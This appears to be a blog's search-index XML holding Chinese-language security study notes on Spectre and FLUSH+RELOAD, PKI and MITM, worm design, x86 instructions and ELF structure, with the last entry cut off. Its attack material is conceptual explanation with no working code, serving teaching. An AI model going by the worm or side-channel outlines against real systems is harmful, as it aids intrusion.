<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>systemSec</title>
    <link href="/2022/07/20/systemSec/"/>
    <url>/2022/07/20/systemSec/</url>
    
    <content type="html"><![CDATA[<h3 id="幽灵-Spectre"><a href="#幽灵-Spectre" class="headerlink" title="幽灵(Spectre)"></a>幽灵(Spectre)</h3><p>幽灵漏洞主要利用了CPU设计过程中的一个缺陷，使用侧信道攻击的方式可以获取到程序本身不能读取到的内存信息。在CPU访问内存（RAM）时，其会首先检查相应的内容有没有被缓存在自己的cache中，如果已经存入cache，那么就可以更快速的访问（cache hit），如果没有的话，需要将内存中的内容加载进cache方便后续访问（cache miss）。</p><p>这个方法叫 <code>FLUSH+RELOAD</code>。我们可以利用这个信息（访问的时间）来确定一块内存是不是最近被访问过。以数组为例，这个操作的流程是：</p><ol><li>将整个数组中的元素全部flush，也就是确保他们都不再cache中。</li><li>调用目标函数，目标函数会访问一个秘密index的内存。</li><li>逐次load整个数组，查看哪一个元素被load时的用时最少，那么这个元素就很有可能被目标函数访问过。</li></ol><p>非顺序执行：指的是CPU为了优化执行流程，会提前预判一个判断语句并开始投机性地执行预判以后的语句。如果预判正确，那么这样会提升效率。如果预判失败，那么就会回滚所有已经做过的操作，例如恢复寄存器等等。但是问题出在其没有回滚cache，也就是说，如果CPU预判了一个语句，那么这时投机性执行访问过的内存就会被放在cache中。如果最后结果为误判，那么cache也不会被恢复到原来的情况。我们可以利用这一点来在即使无法通过判断条件的情况下执行后续代码，并利用cache的缓存来得到结果。</p><p>这就是幽灵漏洞，以尝试越界访问数组为例，目标函数会判断传入的index是否在数组边界内，如果在的话就返回对应的数组内容。</p><ol><li>我们可以首先训练CPU，不断的满足判断条件，让他在攻击中也会预判条件满足（尽管最终的条件是不满足）。</li><li>当CPU预判条件满足时，会执行后续语句，这时尽管传入的index超出的数组边界，也会被执行，并且被返回。我们会提前布置好一个全部flush过的工具数组，用来保存返回的结果。返回后我们可以将以这个值作为index的工具数组的值进行修改&#x2F;访问，让工具数组的这个index的内容进入cache。</li><li>最后我们reload一遍工具数组，哪一个index被访问过，那么这个index的值就是之前越界访问的数组的值。</li><li>为了避免噪声干扰，我们可以将同样的实验重复多次，来增加准确率。</li></ol><p>幽灵不止可以访问同一个进程中的被保护的内存，还可以跨进程进行攻击。</p>]]></content>
    
    
    
    <tags>
      
      <tag>System Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Cryptography</title>
    <link href="/2022/07/18/Crypto/"/>
    <url>/2022/07/18/Crypto/</url>
    
    <content type="html"><![CDATA[<h3 id="Public-Key-Infrastructure-PKI"><a href="#Public-Key-Infrastructure-PKI" class="headerlink" title="Public-Key Infrastructure(PKI)"></a>Public-Key Infrastructure(PKI)</h3><p>PKI主要是用来防止MITM攻击的。当客户端想要和一个网站建立HTTPS链接时，网站会发给客户端一个他自己的公钥证书，PKI用来证明这个公钥证书确实是属于这个网站的，而不是其他人的。</p><p>世界上有很多Certificate Authority。在每一个操作系统&#x2F;浏览器中都内嵌了这些CA的根证书（他们的根证书是自签发的）。比如VeriSign的根证书就被放在操作系统中，如果我们开设了一个网站，我们可以生成一个包含有我们的域名的CSR(Certificate Signing Request)发给VeriSign（也可以使用SAN来包含多个域名），他会用自己的根证书和私钥来把我们的公钥证书签发给我们，那当用户访问我们的网站的时候，网站把公钥证书发给用户，用户的浏览器就可以使用操作系统中自带的VeriSign的根证书来验证我们这个公钥证书的真实性。</p><p>而MITM攻击的原理就是，如果我们可以将用户访问一个网站的流量导入到我们的服务器，我们就知道他要访问的网站是什么，我们就可以使用我们自己的公钥来替换掉原本网站的公钥，并发给用户。用户使用这个公钥加密一个secret，我们就可以拿自己的私钥来解密得到这个secret，再用原网站的公钥加密，发给那个网站。这个secret是用来加密后续的流量的，如果我们已经拿到了这个secret，那么我们就可以解密所有后续发送和接受的流量，我们还可以对流量进行篡改。</p><p>而PKI就是保证了，当用户收到（我们的）服务器发来的假公钥证书时，可以通过CA根证书来进行校验，从而察觉到这个证书不是真正想要访问的网站发来的证书。（如果我们把这个颁发假证书的CA根证书加入到操作系统&#x2F;浏览器的信任证书列表中，那我们就可以实现无痕的MITM攻击了，但是这需要用户配合&#x2F;或者用来向自己的操作系统中插入证书用来抓取流量）</p><h3 id="Transport-Layer-Security-TLS"><a href="#Transport-Layer-Security-TLS" class="headerlink" title="Transport Layer Security(TLS)"></a>Transport Layer Security(TLS)</h3><p>TLS协议是封装在TCP协议之上的一个协议，作为客户端，需要在建立TLS之前设置好一些context，例如CA证书的目录，是否进行证书校验，以及是否进行域名校验。作为服务器端，需要设置好服务器的公钥证书以及私钥。两方在握手阶段会协商好后续要采用的一系列加密&#x2F;MD的算法，以及利用非对称加密共享一个secret，作为后续对称加密的密钥使用。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NetSec</title>
    <link href="/2022/07/12/netSec/"/>
    <url>/2022/07/12/netSec/</url>
    
    <content type="html"><![CDATA[<h3 id="蠕虫病毒"><a href="#蠕虫病毒" class="headerlink" title="蠕虫病毒"></a>蠕虫病毒</h3><p>以Morris Worm为例，最基本的蠕虫病毒需要满足以下条件</p><ol><li>通过网络&#x2F;任何可以传播的媒介抵达受害者主机并可以继续传播（主要就是互联网，或者以太网）</li><li>对一个或多个漏洞进行利用，实现RCE（受害者的主机需要运行有漏洞的程序&#x2F;操作系统）</li><li>可以进行自我复制（第一种可以实现纯代码的自我复制，比较复杂；第二种可以使用网络进行恶意脚本的下载，通常使用链式传播，也就是从先驱来下载恶意脚本）</li></ol><p>更高明的蠕虫病毒可以实现：</p><ol><li>拥有更高的传播效率，并且不被受害者发现</li><li>可以实现判断下一个目标是否可达</li><li>防止自我感染，也就是对已经感染过的目标不再进行二次感染</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>Network Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>x86指令集简介</title>
    <link href="/2022/07/05/x86%E6%8C%87%E4%BB%A4%E9%9B%86%E7%AE%80%E4%BB%8B/"/>
    <url>/2022/07/05/x86%E6%8C%87%E4%BB%A4%E9%9B%86%E7%AE%80%E4%BB%8B/</url>
    
    <content type="html"><![CDATA[<h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><img src="/2022/07/05/x86%E6%8C%87%E4%BB%A4%E9%9B%86%E7%AE%80%E4%BB%8B/reg.png" class="" title="register"><p>处理器针对ax系列寄存器做了优化，因此ax相关的指令效率较高，常用于shellcode编写。</p><p><code>rip</code>, <code>eip</code>, <code>ip</code> 是当前执行指令的地址，也就是pc。不能被直接修改，但可以被<code>jmp</code>, <code>call</code>, 和<code>ret</code> 等指令间接修改。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">AH</span>&amp;<span class="hljs-built_in">AL</span>＝<span class="hljs-built_in">AX</span>(accumulator)：累加寄存器 <br><span class="hljs-number">BH</span>&amp;<span class="hljs-built_in">BL</span>＝<span class="hljs-built_in">BX</span>(base)：基址寄存器 <br><span class="hljs-number">CH</span>&amp;<span class="hljs-built_in">CL</span>＝<span class="hljs-built_in">CX</span>(count)：计数寄存器 <br><span class="hljs-number">DH</span>&amp;<span class="hljs-built_in">DL</span>＝<span class="hljs-built_in">DX</span>(data)：数据寄存器 <br><span class="hljs-built_in">SP</span>（Stack Pointer）：堆栈指针寄存器 <br><span class="hljs-built_in">BP</span>（Base Pointer）：基址指针寄存器 <br><span class="hljs-built_in">SI</span>（Source Index）：源变址寄存器 <br><span class="hljs-built_in">DI</span>（Destination Index）：目的变址寄存器 <br><span class="hljs-built_in">IP</span>（Instruction Pointer）：指令指针寄存器 <br><span class="hljs-built_in">CS</span>（Code <span class="hljs-meta">Segment</span>）代码段寄存器 <br><span class="hljs-built_in">DS</span>（Data <span class="hljs-meta">Segment</span>）：数据段寄存器 <br><span class="hljs-built_in">SS</span>（Stack <span class="hljs-meta">Segment</span>）：堆栈段寄存器 <br><span class="hljs-built_in">ES</span>（Extra <span class="hljs-meta">Segment</span>）：附加段寄存器 <br></code></pre></td></tr></table></figure><img src="/2022/07/05/x86%E6%8C%87%E4%BB%A4%E9%9B%86%E7%AE%80%E4%BB%8B/flags.png" class="" title="flags"><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">OF</span> overflow flag 溢出标志 操作数超出机器能表示的范围表示溢出,溢出时为<span class="hljs-number">1</span>. <br><span class="hljs-attribute">SF</span> sign Flag 符号标志 记录运算结果的符号,结果负时为<span class="hljs-number">1</span>. <br><span class="hljs-attribute">ZF</span> zero flag 零标志 运算结果等于<span class="hljs-number">0</span>时为<span class="hljs-number">1</span>,否则为<span class="hljs-number">0</span>. <br><span class="hljs-attribute">CF</span> carry flag 进位标志 最高有效位产生进位时为<span class="hljs-number">1</span>,否则为<span class="hljs-number">0</span>. <br><span class="hljs-attribute">AF</span> auxiliary carry flag 辅助进位标志 运算时,第<span class="hljs-number">3</span>位向第<span class="hljs-number">4</span>位产生进位时为<span class="hljs-number">1</span>,否则为<span class="hljs-number">0</span>. <br><span class="hljs-attribute">PF</span> parity flag 奇偶标志 运算结果操作数位为<span class="hljs-number">1</span>的个数为偶数个时为<span class="hljs-number">1</span>,否则为<span class="hljs-number">0</span>. <br><span class="hljs-attribute">DF</span> direcion flag 方向标志 用于串处理.DF=<span class="hljs-number">1</span>时,每次操作后使SI和DI减小.DF=<span class="hljs-number">0</span>时则增大. <br><span class="hljs-attribute">IF</span> interrupt flag 中断标志 IF=<span class="hljs-number">1</span>时,允许CPU响应可屏蔽中断,否则关闭中断. <br><span class="hljs-attribute">TF</span> trap flag 陷阱标志 用于调试单步操作.<br></code></pre></td></tr></table></figure><h3 id="数据传送"><a href="#数据传送" class="headerlink" title="数据传送"></a>数据传送</h3><p><code>mov</code> 指令，用于数据传送。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov eax,12345h<br>mov eax,ebx<br>mov esi,dword ptr [00401000h]<br></code></pre></td></tr></table></figure><p><code>xchg</code> 指令，用于数据交换。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">xchg eax,ebx<br>xchg [esi],edx<br></code></pre></td></tr></table></figure><p><code>lea</code> 指令，用于装载有效地址，由于效率较高，因此经常运算中作为优化使用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">lea eax,[00401000h]     ; eax = 401000h<br>lea ebx,[eax+edx]       ; ebx = eax+edx<br></code></pre></td></tr></table></figure><blockquote><p>数据传送类指令不影响任何标志位。</p></blockquote><h3 id="算术运算"><a href="#算术运算" class="headerlink" title="算术运算"></a>算术运算</h3><p><code>add</code> 指令，加法运算。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">add eax,1<br>add eax,ebx<br>add dword ptr [00401000h],2<br>add [00401000h],eax<br></code></pre></td></tr></table></figure><p><code>sub</code> 指令，减法运算。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">sub eax,1<br>sub eax,ebx<br>sub dword ptr [00401000h],2<br>sub [00401000h],eax<br></code></pre></td></tr></table></figure><p><code>adc</code> 指令，带进位加法运算，相当于在进行 add 指令的操作后再加上了 CF 位的值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">; 等价于 adc eax,edx<br>add eax,edx<br>adc eax,0<br></code></pre></td></tr></table></figure><p><code>sbb</code> 指令，带借位减法运算，相当于在进行 sub 指令的操作后减去了 CF 位的值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">; 等价于 sbb eax,edx<br>sub eax,edx<br>sbb eax,0<br></code></pre></td></tr></table></figure><blockquote><p>加减法指令影响所有标志位。</p></blockquote><p><code>inc</code> 指令，加一运算。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">inc eax<br>inc word ptr [esi]<br></code></pre></td></tr></table></figure><p><code>dec</code> 指令，减一运算。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">dec eax<br>dec word ptr [esi]<br></code></pre></td></tr></table></figure><blockquote><p>inc、dec 指令不影响 CF 标志位。</p></blockquote><p><code>neg</code> 指令，求补指令，即取相反数，相当于按位取反后加 1。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">neg eax<br>neg word ptr [esi]<br></code></pre></td></tr></table></figure><blockquote><p>neg 指令影响除 CF 外的所有标志位，并对 CF 置 1。</p></blockquote><p><code>mul</code> &#x2F; <code>imul</code> 指令，乘法 &#x2F; 有符号乘法运算，mul 只有一个操作数，不会溢出，而 imul 可以有 1 ~ 3 个操作数，当只有一个操作数时，不会溢出，否则可能发生截断，这两者的计算逻辑为：</p><ul><li>8 位乘法：16 位被乘数放在 ax 中，8 位乘数为源操作数，结果的低位放在 al 中，高位放在 ah 中。</li><li>16 位乘法：32 位被乘数放在 <code>dx:ax</code> 中，16 位乘数为源操作数，结果的低位放在 ax 中，高位放在 dx 中。</li><li>32 位乘法：64 位被乘数放在 <code>edx:eax</code> 中，32 位乘数为源操作数，结果的低位放在 eax 中，高位放在 edx 中。</li><li>64 位乘法：128 位被乘数放在 <code>rdx:rax</code> 中，64 位乘数为源操作数，结果的低位放在 rax 中，高位放在 rdx 中。</li></ul><p>其中，当为 mul 指令时，所有操作数和结果均被看作无符号数，为 imul 指令时，则为有符号数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mul ebx<br>imul reg,reg/mem/imm                ; reg = reg * reg/mem/imm<br>imul reg,reg/mem/imm,reg/mem/imm    ; reg = reg/mem/imm * reg/mem/imm<br></code></pre></td></tr></table></figure><blockquote><p>乘法指令只影响 OF 和 CF 标志位。</p></blockquote><p><code>div</code> &#x2F; <code>idiv</code> 指令，除法 &#x2F; 有符号除法运算，只有一个操作数。</p><ul><li>8 位除法：16 位被除数放在 ax 中，8 位除数为源操作数，结果的商放在 al 中，余数放在 ah 中。</li><li>16 位除法：32 位被除数放在 dx:ax 中，16 位除数为源操作数，结果的商放在 ax 中，余数放在 dx 中。</li><li>32 位除法：64 位被除数放在 edx:eax 中，32 位除数为源操作数，结果的商放在 eax 中，余数放在 edx 中。</li><li>64 位除法：128 位被除数放在 rdx:rax 中，64 位除数为源操作数，结果的商放在 rax 中，余数放在 rdx 中。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">; 无符号除法<br>xor dx,dx       ; 清零<br>mov ax,1000h<br>div bx<br><br>; 有符号除法<br>mov ax,8000h<br>cwd             ; 符号扩展<br>idiv bx<br></code></pre></td></tr></table></figure><blockquote><p>除法指令不影响任何标志位。</p></blockquote><h3 id="位运算"><a href="#位运算" class="headerlink" title="位运算"></a>位运算</h3><p><code>and</code> 指令，按位与运算，常用于复位或保留需要的位。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">and eax,1<br>and word ptr [00401000h],5<br>and word ptr [00401000h],edx<br></code></pre></td></tr></table></figure><p><code>or</code> 指令，按位或运算，常用于置位。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">or eax,1<br>or word ptr [00401000h],5<br>or word ptr [00401000h],edx<br></code></pre></td></tr></table></figure><p><code>xor</code> 指令，按位异或运算，由于异或运算的逆运算为它本身，因此常在加密算法中使用，以及由于效率较高，常用来清零。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">xor eax,eax                     ; eax = 0<br>xor word ptr [00401000h],5<br>xor word ptr [00401000h],edx<br></code></pre></td></tr></table></figure><blockquote><p>and、or、xor 影响除 AF 外的 SF、ZF、PF 标志位， 并对 OF、CF 清零。</p></blockquote><p><code>not</code> 指令，按位非运算。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">not eax<br>not word ptr [00401000h]<br></code></pre></td></tr></table></figure><blockquote><p>not 不影响任何标志位。</p></blockquote><h3 id="移位操作"><a href="#移位操作" class="headerlink" title="移位操作"></a>移位操作</h3><p><code>shl</code> &#x2F; <code>shr</code> 指令，逻辑左 &#x2F; 右移，通常用于无符号运算。移位次数可以是 <code>cl</code> 寄存器或 8 位整数。左移时，最低位用 0 填充，最高位移入 CF 标志位，右移时，最高位用 0 填充，最低位移入 CF 标志位。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">shl eax,2<br>shr eax,cl<br></code></pre></td></tr></table></figure><p><code>sal</code> &#x2F; <code>sar</code> 指令，算术左 &#x2F; 右移，通常用于有符号运算。移位次数可以是 <code>cl</code> 寄存器或 8 位整数。左移时，最与 shl 指令完全相同，右移时，最高位用符号位填充，最低位移入 CF 标志位。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">sal eax,2    ; 等价于 shl eax,2<br>sar eax,4<br></code></pre></td></tr></table></figure><blockquote><p>逻辑和算术移位指令影响除 AF 外的 5 个标志位。</p></blockquote><p><code>rol</code> &#x2F; <code>ror</code> 指令，循环左 &#x2F; 右移，即从一端移出的位移动到的另一端，因此不会丢弃位，通常用来交换字节的顺序。左移时，最高位放到 CF 标志位和最低位，右移时，最低位放到 CF 标志位和最高位。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">rol eax,2<br>ror eax,2<br></code></pre></td></tr></table></figure><blockquote><p>循环移位指令只影响 CF 和 OF 标志位。</p></blockquote><h3 id="堆栈操作"><a href="#堆栈操作" class="headerlink" title="堆栈操作"></a>堆栈操作</h3><p><code>push</code> &#x2F; <code>pop</code> 指令，数据入栈 &#x2F; 出栈操作。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push eax<br>push [00401000h]<br>push 3<br>pop edx<br>pop [00401000h]<br></code></pre></td></tr></table></figure><p><code>pushf</code> &#x2F; <code>pushfd</code> &#x2F; <code>pushfq</code> 指令，操作码都为 0x9c，将标志寄存器的值保存在栈上，pushf 可用于 32 &#x2F; 64 位，pushfd 只能用于 32 位，pushfq 只能用于 64 位。</p><p><code>popf</code> &#x2F; <code>popfd</code> &#x2F; <code>popfq</code> 指令，操作码都为 0x9d，从栈中恢复标志寄存器的值，popf 可用于 32 &#x2F; 64 位，popfd 只能用于 32 位，popfq 只能用于 64 位。</p><p><code>pusha</code> &#x2F; <code>pushad</code> 指令，操作码都为 0x60，将通用寄存器的值保存在栈上，只能用于 32 位程序。</p><p><code>popa</code> &#x2F; <code>popad</code> 指令，操作码都为 0x61，从栈中恢复通用寄存器的值，只能用于 32 位程序。</p><h3 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h3><p><code>jmp</code> 无条件转移指令，直接跳到操作数给出的地址执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">jmp 00401000h<br>jmp eax<br>jmp [esi]<br>jmp dword ptr [00403000h]<br></code></pre></td></tr></table></figure><p><code>jcc</code> 条件转移指令，指一系列根据标志位判断跳转的指令，如下所示。</p><table><thead><tr><th align="left">指令</th><th align="left">标志位</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left">jo</td><td align="left">OF &#x3D; 1</td><td align="left">溢出</td></tr><tr><td align="left">jno</td><td align="left">OF &#x3D; 0</td><td align="left">无溢出</td></tr><tr><td align="left">jc &#x2F; jb &#x2F; jnae</td><td align="left">CF &#x3D; 1</td><td align="left">进位 &#x2F; 小于 &#x2F; 不大于等于</td></tr><tr><td align="left">jnc &#x2F; jnb &#x2F; jae</td><td align="left">CF &#x3D; 0</td><td align="left">无进位 &#x2F; 不小于 &#x2F; 大于等于</td></tr><tr><td align="left">je &#x2F; jz</td><td align="left">ZF &#x3D; 1</td><td align="left">等于 &#x2F; 等于零</td></tr><tr><td align="left">jne &#x2F; jnz</td><td align="left">ZF &#x3D; 0</td><td align="left">不等于 &#x2F; 不等于零</td></tr><tr><td align="left">jbe &#x2F; jna</td><td align="left">CF &#x3D; 1 or ZF &#x3D; 1</td><td align="left">小于等于 &#x2F; 不大于</td></tr><tr><td align="left">jnbe &#x2F; ja</td><td align="left">CF &#x3D; 0 and ZF &#x3D; 0</td><td align="left">不小于等于 &#x2F; 大于</td></tr><tr><td align="left">js</td><td align="left">SF &#x3D; 1</td><td align="left">正数</td></tr><tr><td align="left">jns</td><td align="left">SF &#x3D; 0</td><td align="left">负数</td></tr><tr><td align="left">jp &#x2F; jpe</td><td align="left">PF &#x3D; 1</td><td align="left">偶数</td></tr><tr><td align="left">jnp &#x2F; jpo</td><td align="left">PF &#x3D; 0</td><td align="left">奇数</td></tr><tr><td align="left">jl &#x2F; jnge</td><td align="left">SF ≠ OF</td><td align="left">小于 &#x2F; 不大于等于</td></tr><tr><td align="left">jnl &#x2F; jge</td><td align="left">SF &#x3D; OF</td><td align="left">不小于 &#x2F; 大于等于</td></tr><tr><td align="left">jle &#x2F; jng</td><td align="left">SF ≠ OF or ZF &#x3D; 1</td><td align="left">小于等于 &#x2F; 不大于</td></tr><tr><td align="left">jnle &#x2F; jg</td><td align="left">SF &#x3D; OF and ZF &#x3D; 0</td><td align="left">不小于等于 &#x2F; 大于</td></tr></tbody></table><p><code>cmp</code> 指令，比较操作，相当于用目的操作数减去源操作数，然后根据结果影响标志位，配合 jcc 指令进行流程控制。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">cmp eax,5<br>je 00401000h<br></code></pre></td></tr></table></figure><p><code>test</code> 指令，测试操作，相当于对两个操作数进行逻辑与运算，但是结果不送入目的操作数，只影响标志位，通常用于判断值是否为 0。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">add eax,ebx<br>test eax,eax<br>jz 00401000h<br></code></pre></td></tr></table></figure><p><code>call</code> 和 <code>ret</code> 指令，主要用于函数过程，call 指令作用和 jmp 类似，都是无条件跳转，但是在跳转之前会将下一条指令的地址入栈，以配合 ret 指令返回。ret 指令在返回时不修正栈顶，如果遇到需要被调函数自己平衡栈的情况，可以用 <code>ret imm</code> 指令来修正栈顶后返回。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov eax,1<br>push eax<br>call func<br>; ...<br>func:<br>add eax,2<br>ret 4<br></code></pre></td></tr></table></figure><p><code>loop</code> 指令，循环控制操作，现在已很少使用。通过 ecx 保存需要循环的次数，每次循环开始时 ecx 自动减一，当 ecx 为 0 时结束循环。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov eax,0<br>mov ecx,5<br>A:<br>add eax,ecx<br>loop A<br></code></pre></td></tr></table></figure><h3 id="串操作"><a href="#串操作" class="headerlink" title="串操作"></a>串操作</h3><p><code>movsb</code> &#x2F; <code>movsw</code> &#x2F; <code>movsd</code> &#x2F; <code>movsq</code> 指令，串传送指令，不同的后缀表示单次传送数据的大小。在使用时通常会先设置 DF 标志，表示传送的方向，并把 esi 指向的内存单元的值传送到 edi 指向的内存单元中去，执行后根据 DF 标志和宽度，esi 和 edi 会自动增加或减少相应的大小。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov esi,00403000h<br>mov edi,00403010h<br>cld<br>movsb<br>std<br>movsb<br></code></pre></td></tr></table></figure><p><code>stosb</code> &#x2F; <code>stosw</code> &#x2F; <code>stosd</code> &#x2F; <code>stosq</code> 指令，将 al &#x2F; ax &#x2F; eax &#x2F; rax 的值存储到 edi 指向的内存单元。在使用时通常会先设置 DF 标志，表示传送的方向，执行后根据 DF 标志和宽度，esi 和 edi 会自动增加或减少相应的大小。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov al,1<br>mov edi,00403000h<br>stosb<br>mov eax,2<br>stdsd<br>std<br>mov rax,3<br>stdsq<br></code></pre></td></tr></table></figure><p><code>rep</code> 重复前缀指令，movs 和 stos 指令都只能执行一次操作，要重复执行则需要使用 rep 前缀。每次开始执行时，ecx 的值会自动减 1，当 ecx 不为 0 时会重复执行，为 0 时自动结束。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov esi,00401000h<br>mov edi,00401010h<br>mov ecx,4<br>cld<br>rep movsd<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Binary Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ELF文件结构</title>
    <link href="/2022/07/01/ELF-file-structure/"/>
    <url>/2022/07/01/ELF-file-structure/</url>
    
    <content type="html"><![CDATA[<h1 id="ELF文件结构分析"><a href="#ELF文件结构分析" class="headerlink" title="ELF文件结构分析"></a>ELF文件结构分析</h1><p>ELF文件包括linux下的可执行文件，共享链接库等等。ELF文件的结构可以有两个平行的视角，一个是链接的视角，一个是装载的视角。</p><p>从链接视角来看，ELF文件被分成了不同的节区（Section），每一个节区用来存放不同的数据，比如.text段一般用来存放指令&#x2F;代码，.data用来存放已初始化的静态变量，.rodata用来存放只读变量（const），.bss用来存放未初始化的静态变量，.got用来存放全局偏移，包括全局变量的偏移和全局函数地址的偏移（调用外部函数时，通过这个偏移来找到真正的函数地址），.plt存放一段代码，启用lazy binding时，第一次调用外部函数会将具体的库进行装载，并且确定偏移至got表中，plt负责调用读取got中的偏移并进行跳转。</p><img src="/2022/07/01/ELF-file-structure/SHT.png" class="" title="Sections"><p>从装载视角来看，程序其实并不需要进行像Segment这样细粒度的分类也可以执行。所以程序头表（program header table）定义了一些Segment，不同的segment拥有不同的读写执行权限，拥有相同权限的section可能会被放在同一个segment中。在装载的时候，系统还需要进行页对齐，比如进行0x1000的补全。</p><img src="/2022/07/01/ELF-file-structure/PHT.png" class="" title="Segments">]]></content>
    
    
    
    <tags>
      
      <tag>Binary Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Binary vulnerabilities</title>
    <link href="/2022/06/28/binarySecurity/"/>
    <url>/2022/06/28/binarySecurity/</url>
    
